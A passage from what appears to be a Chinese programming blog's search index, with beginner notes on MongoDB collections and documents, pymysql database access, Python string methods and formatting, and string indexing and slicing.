tables</code></pre><ul><li>集合的命名规则:<ol><li>不能为空字符串,不能有’\0’</li><li>不能以system.开头,这是系统集合的保留前缀</li><li>不能和保留字重复</li></ol></li></ul><p><strong>创建集合2</strong></p><pre><code>db.collectionName.insert()#当向一个集合中插入文档时,如果该集合不存在则自动创建db.cat.insert({a:1})#如果cat不存在则会创建cat集合并插入该数据</code></pre><h5 id="删除集合"><a href="#删除集合" class="headerlink" title="删除集合"></a><strong>删除集合</strong></h5><pre><code>db.collectionName.drop()db.cat.drop()#删除cat集合</code></pre><h5 id="集合重命名"><a href="#集合重命名" class="headerlink" title="集合重命名"></a><strong>集合重命名</strong></h5><pre><code>db.collectionName.renameCollection(&apos;new_name&apos;)e.g.db.class2.renameCollection(&apos;class0&apos;)#将class2重命名为class0</code></pre><h4 id="文档-记录"><a href="#文档-记录" class="headerlink" title="文档 (记录)"></a><strong>文档</strong> (记录)</h4><ul><li><p>键值对组成文档 —&gt; 类似Python中的字典</p></li><li><p>bson —&gt; json —&gt; JavaScrip</p></li><li><p>mongodb 中文档的数据组织形式为bson格式,类似Python的字典,也是由键值对构成</p></li><li><p>文档中 <strong>键(域/字段)</strong> 的命名规则:  </p><ol><li>utf-8格式字符串</li><li>不能有\0,习惯上不用 <code>. 和 $</code></li><li>以_开头的多为保留键,自定义时一般不以_开头</li></ol></li><li><p><strong>注意</strong> </p><ul><li>文档键值对是有序的</li><li>mongodb中严格区分大小写</li></ul></li><li><p><strong>值(记录内容)</strong>: mongodb的支持数据类型</p></li><li><p>支持的数据类型</p></li></ul><table><thead><tr><th align="center">类型</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">整型</td><td align="center">整数</td></tr><tr><td align="center">布尔类型</td><td align="center">true false</td></tr><tr><td align="center">浮点型</td><td align="center">小数</td></tr><tr><td align="center">Arrays</td><td align="center">数组类型[1,2,3]</td></tr><tr><td align="center">Timestamp</td><td align="center">时间戳</td></tr><tr><td align="center">Date</td><td align="center">时间日期</td></tr><tr><td align="center">Object</td><td align="center">对象/内部文档</td></tr><tr><td align="center">Null</td><td align="center">空值</td></tr><tr><td align="center">Symbol</td><td align="center">特殊字符</td></tr><tr><td align="center">String</td><td align="center">字符串</td></tr><tr><td align="center">Binary data</td><td align="center">二进制字串</td></tr><tr><td align="center">code</td><td align="center">代码</td></tr><tr><td align="center">regex</td><td align="center">正则表达式</td></tr><tr><td align="center">ObjectId</td><td align="center">ObjectId()字串</td></tr></tbody></table><ul><li>ObjectId : 系统自动为每个文档生成 的不重复的主键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">键名称: _id</span><br><span class="line">值:ObjectId(&quot;随机24位16进制数&quot;)</span><br><span class="line"></span><br><span class="line">24位16进制数</span><br><span class="line">前8位 文档创建时间</span><br><span class="line">6位 机器ID</span><br><span class="line">4位 进程ID</span><br><span class="line">6位 计数器</span><br></pre></td></tr></table></figure></li></ul><p><strong>集合中文档特点</strong></p><ul><li>集合中的文档域不一定相同 -&gt; 不保证数据一致性</li><li>集合中的文档结构不一定相同</li></ul><p><strong>集合设计原则</strong></p><ul><li>集合中的文档尽可能描述的数据类似</li><li>同一类文档放在相同的集合,不同的文档分集合存放</li><li>层次的包裹不宜太多</li></ul><h4 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a><strong>插入文档</strong></h4><pre><code>db.collectionName.insert()e.g.db.class0.insert({name:&apos;Lucy&apos;,age:16,sex:&apos;w&apos;})#当作为文档插入时键可以不加引号</code></pre><p><strong>查看插入结果</strong></p><pre><code>db.class0.find()</code></pre><p><strong>插入多条文档</strong></p><pre><code>db.collectionName.insert([{},{},{}])e.g.db.class0.insert([{name:&apos;阿猫&apos;,age:22},{name:&apos;阿狗&apos;,age:23},{name:&apos;宝宝&apos;,age:3}])</code></pre><ul><li><code>_id</code> 为系统自动添加主键,如果自己写 <code>_id</code>域则会使用自己写的值,但是该值仍不允许重复</li></ul><p><strong>save 插入数据</strong></p><pre><code>db.collectionName.save()e.g.db.class0.save({name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;bajie&apos;,age:17,sex:&apos;m&apos;})db.class0.save({_id:2,name:&apos;wukong&apos;,age:17,sex:&apos;m&apos;})</code></pre><ul><li>在不加_id时使用同 insert</li><li>如果使用save插入的时候加了_id,则如果_id值不存在则正常插入,如果该值存在,则修改原来内容</li><li>save无法一次插入多个文档</li></ul><h4 id="获取集合对象"><a href="#获取集合对象" class="headerlink" title="获取集合对象"></a><strong>获取集合对象</strong></h4><pre><code>db.getCollection(&apos;collection_name&apos;)e.g.db.getCollection(&quot;class0&quot;).insert({name:&apos;wukong&apos;,age:1700})</code></pre>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
            <tag> nosql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python编程使用MySQL</title>
      <link href="/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/"/>
      <url>/2018/03/10/MySQL/Python%E7%BC%96%E7%A8%8B%E4%BD%BF%E7%94%A8MySQL/</url>
      
        <content type="html"><![CDATA[<h4 id="Python数据库编程"><a href="#Python数据库编程" class="headerlink" title="Python数据库编程"></a><strong>Python数据库编程</strong></h4><ul><li>python数据库接口(Python DB-API)<ul><li>为开发人员提供的数据库应用编程接口</li><li>支持的数据库服务软件<ul><li>Mysql, Oracle, SQL_Server, Mongodb…</li></ul></li><li>python提供的操作mysql模块  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3: pymysql</span><br><span class="line">python2: MySQLdb</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="pymysql模块使用流程"><a href="#pymysql模块使用流程" class="headerlink" title="pymysql模块使用流程"></a><strong>pymysql模块使用流程</strong></h4><ol><li>建立数据库连接<ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul></li><li>创建游标对象</li><li>使用游标对象的方法操作数据库</li><li>提交commit</li><li>关闭游标对象</li><li>关闭数据库连接</li></ol><p><strong>示例</strong> <code>mysql_test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="comment">#1.创建数据库连接对象</span></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"><span class="comment">#2.创建游标对象</span></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"><span class="comment">#3.利用游标对象cursor的方法来操作数据库</span></span><br><span class="line">cursor.execute(<span class="string">"insert into userinfo values(1,200000,'sicuansheng');"</span>)</span><br><span class="line"><span class="comment">#4.提交到数据库commit</span></span><br><span class="line">db.commit()</span><br><span class="line"><span class="comment">#5. 关闭游标对象</span></span><br><span class="line">cursor.close()</span><br><span class="line"><span class="comment">#6.关闭数据库连接</span></span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>建立数据库连接</strong></p><ul><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象名 &#x3D; pymysql.connect(&quot;主机地址&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;库名&quot;,charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure></li><li>connect连接对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cursor() #创建一个游标对象db.cursor()</span><br><span class="line">commit() #提交到数据库执行(表记录增删改)</span><br><span class="line">rollback() #回滚</span><br><span class="line">close()#关闭数据库连接</span><br></pre></td></tr></table></figure></li><li>cursor游标对象支持的方法  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">execute(&quot;SQL命令&quot;)#执行SQL命令</span><br><span class="line">fetchone()#取得结果集的第一条记录</span><br><span class="line">fetchmany(n)#取得结果集的 n 条纪录</span><br><span class="line">fetchall()#取得结果集的所有记录</span><br><span class="line">close()#关闭游标对象</span><br></pre></td></tr></table></figure></li></ul><p><strong>SQL查询示例</strong> <code>inquiry.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">db=pymysql.connect(<span class="string">"localhost"</span>,<span class="string">"cat"</span>,<span class="string">"heybeauty"</span>,<span class="string">"db2"</span>,charset=<span class="string">"utf8"</span>)</span><br><span class="line"></span><br><span class="line">cursor=db.cursor()</span><br><span class="line"></span><br><span class="line">sql_select=<span class="string">"select * from userinfo;"</span></span><br><span class="line">cursor.execute(sql_select)</span><br><span class="line"></span><br><span class="line">data=cursor.fetchone()</span><br><span class="line">print(<span class="string">"fetchone的结果为"</span>,data)</span><br><span class="line"></span><br><span class="line">data2=cursor.fetchmany(<span class="number">2</span>)</span><br><span class="line">print(<span class="string">"fetchmany(2)的结果为"</span>,data2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data2:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">data3=cursor.fetchall()</span><br><span class="line">print(<span class="string">"fetchall()的结果为"</span>,data3)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data3:</span><br><span class="line">print(i)</span><br><span class="line"></span><br><span class="line">db.commit()</span><br><span class="line">cursor.close()</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure><p><strong>MySQL workbench</strong> </p><ul><li>官方图形化界面管理工具<ul><li><code>https://www.mysql.com/products/workbench/</code></li></ul></li></ul><p><strong>ER模型&amp;ER图</strong></p><ul><li>定义<ul><li>ER模型即 实体 - 关系 模型</li><li>ER图即 实体关系图</li></ul></li><li>三个概念<ul><li>实体</li><li>属性</li><li>关系<ul><li>定义: 实体之间的关系</li><li>分类<ul><li>一对一关系(1:1) # 班级和班长    </li><li>一对多关系(1:n) # 班级和学生</li><li>多对多关系(m:n) # 学生和课程</li></ul></li></ul></li><li>ER图的绘制<ul><li>矩形框代表实体,菱形框代表关系,椭圆形代表属性</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> Python </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> mysql </tag>
            
            <tag> pymysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3中常用的字符串方法</title>
      <link href="/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/"/>
      <url>/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<ul><li>方法的调用语法:<ul><li>对象.方法名(方法传参)</li></ul></li><li>说明:<ul><li>方法的调用同函数</li></ul></li><li>示例:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39;abc&#39;.isalpha()#判断&#39;abc&#39;是否全为英文字母</span><br><span class="line">&#39;123&#39;.isalpha()#False,123没有isalpha方法</span><br></pre></td></tr></table></figure></li></ul><h4 id="常用字符串方法"><a href="#常用字符串方法" class="headerlink" title="常用字符串方法"></a><strong>常用字符串方法</strong></h4><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">s.isdigit()</td><td align="center">判断字符串中的字符是否全为数字</td></tr><tr><td align="center">s.isalpha()</td><td align="center">判断字符串是否全为英文字母</td></tr><tr><td align="center">s.islower()</td><td align="center">判断字符串所有字符是否全为小写英文字母</td></tr><tr><td align="center">s.isupper()</td><td align="center">判断字符串所有字符是否全为大写英文字母</td></tr><tr><td align="center">s.isspace()</td><td align="center">判断字符串是否全为空白字符</td></tr><tr><td align="center">s.center(width[,fill])</td><td align="center">将原字符串居中,左右默认填充空格</td></tr><tr><td align="center">s.count(sub[,start[,end]])</td><td align="center">获取一个字符串中子串的个数</td></tr><tr><td align="center">s.find(sub[,start[,end]])</td><td align="center">获取字符串中子串sub的索引,失败返回-1</td></tr><tr><td align="center">s.strip()</td><td align="center">返回去掉左右空白字符的字符串</td></tr><tr><td align="center">s.lstrip()</td><td align="center">返回去掉左侧空白字符的字符串</td></tr><tr><td align="center">字符串</td><td align="center"></td></tr><tr><td align="center">s.upper()</td><td align="center">生成将英文转换为大写的字符串</td></tr><tr><td align="center">s.lower()</td><td align="center">生成将英文转换为小写的字符串</td></tr><tr><td align="center">s.replace(old,new[,count])</td><td align="center">将原字符串的old用new代替,生成一个新的字符串</td></tr><tr><td align="center">s.startswith(prefix[,start[,end]])</td><td align="center">返回s是否是以prefix开头,如以prefix开头返回True</td></tr><tr><td align="center">s.endswith(suffix[,start[,end]])</td><td align="center">返回s是否是以suffix结束,如果以suffix结束返回True</td></tr><tr><td align="center">s.format()</td><td align="center">调用此方法的字符串可以包含字符串字面值或者以花括号 <code>{}</code> 括起来的替换域</td></tr><tr><td align="center">不常用的</td><td align="center"></td></tr><tr><td align="center">s.title()</td><td align="center">生成每个英文单词的首字母大写字符串</td></tr><tr><td align="center">s.isnumeric()</td><td align="center">判断字符串是否全为数字字符</td></tr></tbody></table><ul><li><strong>示例</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'abc'</span>.center(<span class="number">10</span>)</span><br><span class="line"><span class="string">'   abc    '</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'abc'</span>.center(<span class="number">20</span>,<span class="string">'#'</span>)</span><br><span class="line"><span class="string">'########abc#########'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">'hello world'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">'o'</span>,<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"The sum of 1 + 2 is &#123;0&#125;"</span>.format(<span class="number">1</span>+<span class="number">2</span>)</span><br><span class="line"><span class="string">'The sum of 1 + 2 is 3'</span></span><br></pre></td></tr></table></figure></li><li><em>更多方法请参考官方文档*</em> <code>https://docs.python.org/zh-tw/3/library/stdtypes.html#string-methods</code></li></ul><h4 id="字符串格式化表达式"><a href="#字符串格式化表达式" class="headerlink" title="字符串格式化表达式"></a><strong>字符串格式化表达式</strong></h4><ul><li><p>作用</p><ul><li>生成一定格式的字符串</li></ul></li><li><p>运算符: <code>%</code></p></li><li><p>格式: 格式化字符串 <code>%</code> 参数值或格式化字符串 <code>%</code> (参数值1,参数值2,…)</p></li><li><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fmt=<span class="string">"姓名: %s, 年龄: %d"</span></span><br><span class="line">name=<span class="string">"张飞"</span></span><br><span class="line">age=<span class="number">20</span></span><br><span class="line">print(fmt % (name,age))</span><br></pre></td></tr></table></figure></li><li><p>格式化字符串中的占位符和类型码</p></li></ul><table><thead><tr><th align="center">占位符类型码</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">%s</td><td align="center">字符串</td></tr><tr><td align="center">%r</td><td align="center">字符串,使用repr而不是str</td></tr><tr><td align="center">%c</td><td align="center">整数转为单个字符</td></tr><tr><td align="center">%d</td><td align="center">十进制整数</td></tr><tr><td align="center">%o</td><td align="center">八进制整数</td></tr><tr><td align="center">%x</td><td align="center">十六进制整数(字符a-f小写)</td></tr><tr><td align="center">%X</td><td align="center">十六进制整数(字符A-F大写)</td></tr><tr><td align="center">%e</td><td align="center">指数型浮点数(e小写),如2.9e+10</td></tr><tr><td align="center">%E</td><td align="center">指数型浮点数(E大写),如2.9E+10</td></tr><tr><td align="center">%f,%F</td><td align="center">浮点十进制形式</td></tr><tr><td align="center">%g,%G</td><td align="center">十进制形式浮点或指数浮点自动转换</td></tr><tr><td align="center">%%</td><td align="center">等同于一个%字符</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3中常用的序列函数</title>
      <link href="/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%87%BD%E6%95%B0/"/>
      <url>/2018/02/10/Python/Python_Basic/Python3%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%BA%8F%E5%88%97%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="序列函数"><a href="#序列函数" class="headerlink" title="序列函数"></a><strong>序列函数</strong></h4><ul><li><p><code>len(seq)</code>        #返回序列长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'python'</span></span><br><span class="line">print(len(s))<span class="comment">#6</span></span><br><span class="line">print(len(<span class="string">"python"</span>))<span class="comment">#6</span></span><br></pre></td></tr></table></figure></li><li><p><code>max(x)</code>            #返回序列的最大值的元素</p></li><li><p><code>min(x)</code>            #返回序列的最小值的元素</p></li></ul><h4 id="字符串编码转换函数"><a href="#字符串编码转换函数" class="headerlink" title="字符串编码转换函数"></a><strong>字符串编码转换函数</strong></h4><ul><li><code>ord(c)</code>    #返回一个字符的Unicode值</li><li><code>chr(i)</code>    #返回i这个值所对应的字符<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i=ord(<span class="string">'喵'</span>)</span><br><span class="line">print(i)<span class="comment">#21941</span></span><br><span class="line">c=chr(<span class="number">21941</span>)</span><br><span class="line">print(c)<span class="comment">#喵</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>字符串转unicode小程序</strong> <code>str2unicode.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">'请输入一个字符串:'</span>)</span><br><span class="line"><span class="keyword">if</span> s !=<span class="string">''</span>:</span><br><span class="line">print(s[<span class="number">0</span>],<span class="string">"的编码值是:"</span>,ord(s[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><p><strong>unicode转字符串</strong> <code>nnicode2str</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=int(input(<span class="string">"请输入一个整数值(0~65535):"</span>))</span><br><span class="line">print(code,<span class="string">"所对应的字符是:"</span>,chr(code))</span><br></pre></td></tr></table></figure><h4 id="整数转换为字符串函数"><a href="#整数转换为字符串函数" class="headerlink" title="整数转换为字符串函数"></a><strong>整数转换为字符串函数</strong></h4><ul><li><p><code>hex(i)</code>    #将整数转换为十六进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(1111)</span><br><span class="line">&#39;0x457&#39;</span><br><span class="line">&gt;&gt;&gt; hex(1000)</span><br><span class="line">&#39;0x3e8&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>oct(i)</code>    #将整数转换为八进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; oct(1000)</span><br><span class="line">&#39;0o1750&#39;</span><br><span class="line">&gt;&gt;&gt; oct(1111)</span><br><span class="line">&#39;0o2127&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>bin(i)</code>    #将整数转换为二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bin(1111)</span><br><span class="line">&#39;0b10001010111&#39;</span><br><span class="line">&gt;&gt;&gt; bin(1000)</span><br><span class="line">&#39;0b1111101000&#39;</span><br></pre></td></tr></table></figure></li></ul><p><strong>字符串构造函数</strong></p><ul><li><code>str(obj=&#39;&#39;)</code>        #将对象转换为字符串<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(1000)</span><br><span class="line">&#39;1000&#39;</span><br><span class="line">&gt;&gt;&gt; str(111.11)</span><br><span class="line">&#39;111.11&#39;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 序列函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python字符串的索引和切片</title>
      <link href="/2018/02/09/Python/Python_Basic/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/"/>
      <url>/2018/02/09/Python/Python_Basic/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E7%B4%A2%E5%BC%95%E5%92%8C%E5%88%87%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h4 id="字符串的索引-index"><a href="#字符串的索引-index" class="headerlink" title="字符串的索引 index"></a><strong>字符串的索引</strong> index</h4><ul><li>python的字符串是不可以改变的字符序列</li><li>语法:<ul><li><code>字符串[整数表达式]</code></li></ul></li><li>说明:<ul><li>python序列都可以用索引(index)来访问序列中的对象</li><li>python序列的正向索引是从0开始的,第二个索引为1…,以此类推,最后一个索引是 <code>len(s)-1</code></li><li>python序列的反向索引是从-1开始的,-1代表最后一个,-2代表倒数第二个,以此类推,第一个是 <code>-len(s)</code></li></ul></li><li>示例:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"ABCD"</span></span><br><span class="line">print(s[<span class="number">0</span>]) <span class="comment">#A</span></span><br><span class="line">print(s[<span class="number">2</span>])<span class="comment">#C</span></span><br><span class="line">print(s[<span class="number">-1</span>])<span class="comment">#D</span></span><br><span class="line">print(s[<span class="number">-4</span>])<span class="comment">#A</span></span><br><span class="line">print(s[<span class="number">-5</span>])<span class="comment">#报错</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="字符串切片-slice"><a href="#字符串切片-slice" class="headerlink" title="字符串切片 slice"></a><strong>字符串切片</strong> slice</h4><ul><li>从字符串序列中取出相应的元素,重新组成一个字符串序列</li><li>语法:<ul><li><code>字符串[(开始索引b):(结束索引e)(:(步长s))]</code></li><li>注: 小括号()括起的部分代表可以省略<br>语法说明:</li></ul><ol><li>开始索引是切片切下的位置,0代表第一个元素,1代表第二个元素,-1代表最后一个元素</li><li>结束索引是切片的终止索引(但不包含终止点)</li><li>步长是切片每次获取完当前元素后移动的方向和偏移量<ul><li>没有步长,相当于取值完毕后右移动一个索引的位置(默认为1)</li><li>当步长为正数时,最正向切片</li><li>当步长为负数时,取反向切片<ul><li>反向切片时,默认的起始位置为最后一个元素,终止位置是第一个元素的前一个位置</li></ul></li></ul></li></ol></li><li>示例:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">'ABCDEFGHJKL'</span></span><br><span class="line">print(s[:<span class="number">4</span>])<span class="comment">#ABCD</span></span><br><span class="line">print(s[<span class="number">1</span>:<span class="number">5</span>])<span class="comment">#BCDE</span></span><br><span class="line">print(s[<span class="number">1</span>:<span class="number">-1</span>])<span class="comment">#BCDEFGHJK</span></span><br><span class="line">print(s[<span class="number">-100</span>:<span class="number">100</span>])<span class="comment">#ABCDEFGHJKL</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:]</span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::]</span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">1</span>]<span class="comment">#步长1</span></span><br><span class="line"><span class="string">'ABCDEFGHJKL'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">2</span>]<span class="comment">#步长2</span></span><br><span class="line"><span class="string">'ACEGJL'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">3</span>]<span class="comment">#步长3</span></span><br><span class="line"><span class="string">'ADGK'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[::<span class="number">-1</span>]<span class="comment">#反向</span></span><br><span class="line"><span class="string">'LKJHGFEDCBA'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[:<span class="number">-2</span>:<span class="number">2</span>]</span><br><span class="line"><span class="string">'ACEGJ'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="number">-1</span>:<span class="number">0</span>:<span 